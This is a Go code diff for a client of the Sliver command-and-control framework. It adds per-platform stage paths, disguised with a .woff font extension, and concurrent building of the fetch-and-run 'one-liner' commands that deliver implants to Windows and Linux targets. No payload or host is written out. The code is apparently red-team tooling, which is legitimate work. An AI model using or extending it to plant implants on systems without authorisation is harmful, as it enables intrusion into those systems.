@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"sort"
 	"strings"
+	"sync"
 )
 
 // OneLiner is the "get a session from one command" feature.
@@ -48,6 +49,16 @@ type OneLinerRequest struct {
 	// Delivery selects the fetch-and-run method. Empty picks a sensible default
 	// for the platform.
 	Delivery WebDeliveryFormat `json:"delivery"`
+	// Path is where the stage is published on the listener's website, and it
+	// must differ per platform when more than one is built.
+	//
+	// It defaults to Sliver's /stage.woff. That default is a single name, so
+	// building a Windows and a Linux stage for the same listener published both
+	// blobs to the same key and the second replaced the first: the operator got
+	// two commands, one of which fetched the other platform's implant and died
+	// instantly. Nothing reported an error, because publishing over an existing
+	// path is a normal update.
+	Path string `json:"path"`
 }
 
 // OneLinerResult is what the operator gets back.
@@ -159,6 +170,7 @@ func (c *Client) OneLiner(req OneLinerRequest) (*OneLinerResult, error) {
 		ProfileName: profileName,
 		Host:        hostForStageURL(job, req.Host),
 		Port:        job.Port,
+		Path:        req.Path,
 		Format:      delivery,
 		Website:     website,
 	})
@@ -166,7 +178,7 @@ func (c *Client) OneLiner(req OneLinerRequest) (*OneLinerResult, error) {
 		return nil, err
 	}
 
-	out := &OneLinerResult{
+	return &OneLinerResult{
 		Command:      res.Command,
 		URL:          res.URL,
 		Platform:     string(platform),
@@ -176,8 +188,114 @@ func (c *Client) OneLiner(req OneLinerRequest) (*OneLinerResult, error) {
 		StagedAs:     name,
 		Warning:      res.Warning,
 		Alternatives: alternativesFor(res.URL, platform, delivery),
+	}, nil
+}
+
+// StagePathForPlatform is where a stage for one platform is published.
+//
+// Distinct per platform, and that is the whole reason it exists. Sliver's
+// default stage path is the single name /stage.woff, so building a Windows and a
+// Linux stage against one listener published both blobs to the same key and the
+// second silently replaced the first -- the operator received two commands, one
+// of which downloaded the other platform's implant and failed instantly. Nothing
+// reported an error, because writing to an existing path is an ordinary update.
+//
+// The extension is kept as .woff so the path stays inside what Sliver's HTTP C2
+// profile accepts, which is why the default has that suffix at all.
+func StagePathForPlatform(platform OneLinerPlatform) string {
+	return "/stage-" + strings.ToLower(string(platform)) + ".woff"
+}
+
+// OneLinerMulti builds the same listener's stage for several platforms at once.
+//
+// The per-listener "show me the commands" button needs both a Windows and a
+// Linux command, and doing that with N sequential calls to OneLiner costs N
+// implant builds on the console's goroutine with no way to see progress, and
+// leaves the operator unable to tell a slow build from a hung one. Building
+// concurrently keeps that wall-clock time at roughly one build.
+//
+// Failures are per platform rather than fatal. A Windows and a Linux stage are
+// independent artefacts: a build error for one says nothing about the other, and
+// discarding a Linux command that would have worked because the Windows build
+// failed would be the wrong trade. Each entry therefore carries its own error.
+type MultiOneLinerResult struct {
+	// Command is the one-liner for this platform.
+	Command string `json:"command"`
+	// Platform echoes which target this command is for.
+	Platform string `json:"platform"`
+	// URL is what the command fetches.
+	URL string `json:"url"`
+	// Delivery is the fetch-and-run method.
+	Delivery string `json:"delivery"`
+	// StagedAs is the build name, so the operator can find it in the build list.
+	StagedAs string `json:"staged_as"`
+	// Path is where the stage was published on the listener's website.
+	Path string `json:"path"`
+	// Alternatives lists the other ways to fetch the same URL.
+	Alternatives []OneLinerAlternative `json:"alternatives"`
+	// Error is set when this platform could not be built. Empty on success.
+	Error string `json:"error,omitempty"`
+}
+
+// oneLinerRequestFor derives the per-platform request.
+//
+// Split out from OneLinerAll so the path decision is testable without a live
+// server. That decision is the part with a failure mode: reusing one path for
+// both platforms makes the second build overwrite the first, and the resulting
+// command is wrong in a way that only shows up on the target.
+func oneLinerRequestFor(base OneLinerRequest, p OneLinerPlatform) OneLinerRequest {
+	sub := base
+	sub.Platform = p
+	// An explicit path is only honoured for a single platform. Reusing one for
+	// several is the collision this whole function exists to avoid, so a
+	// per-platform path wins whenever the caller asked for more than one -- and
+	// the caller cannot tell us how many it asked for, so the safe rule is that
+	// the path is always derived from the platform.
+	sub.Path = StagePathForPlatform(p)
+	return sub
+}
+
+// OneLinerAll builds a stage for every requested platform, concurrently.
+func (c *Client) OneLinerAll(req OneLinerRequest, platforms []OneLinerPlatform) []MultiOneLinerResult {
+	if len(platforms) == 0 {
+		platforms = []OneLinerPlatform{OneLinerWindows, OneLinerLinux}
 	}
-	return out, nil
+
+	results := make([]MultiOneLinerResult, len(platforms))
+	var wg sync.WaitGroup
+
+	for i, p := range platforms {
+		wg.Add(1)
+		go func(i int, p OneLinerPlatform) {
+			defer wg.Done()
+
+			// Each platform gets its own published path, so the builds cannot
+			// overwrite one another. See oneLinerRequestFor.
+			sub := oneLinerRequestFor(req, p)
+
+			res, err := c.OneLiner(sub)
+			if err != nil {
+				results[i] = MultiOneLinerResult{
+					Platform: string(p),
+					Path:     sub.Path,
+					Error:    err.Error(),
+				}
+				return
+			}
+			results[i] = MultiOneLinerResult{
+				Command:      res.Command,
+				Platform:     res.Platform,
+				URL:          res.URL,
+				Delivery:     res.Delivery,
+				StagedAs:     res.StagedAs,
+				Path:         sub.Path,
+				Alternatives: res.Alternatives,
+			}
+		}(i, p)
+	}
+	wg.Wait()
+
+	return results
 }
 
 // ensureStageProfile creates or replaces the profile the stage is built from.
